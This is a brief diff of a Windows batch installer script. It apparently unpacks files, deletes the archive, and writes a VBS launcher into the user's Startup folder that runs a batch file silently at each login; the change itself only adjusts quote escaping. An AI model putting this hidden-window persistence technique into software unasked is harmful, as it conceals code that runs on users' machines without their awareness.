@@ -38,7 +38,7 @@ del "%TARGET_DIR%\%ZIP_NAME%"
 :: Create VBS script to run batch silently
 (
   echo Set WshShell = CreateObject("WScript.Shell"^)
-  echo WshShell.Run chr(34^) & "%TARGET_DIR%\%BAT_FILE%" & Chr(34^), 0
+  echo WshShell.Run """"%TARGET_DIR%\%BAT_FILE%"""", 0
   echo Set WshShell = Nothing
 ) > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
 
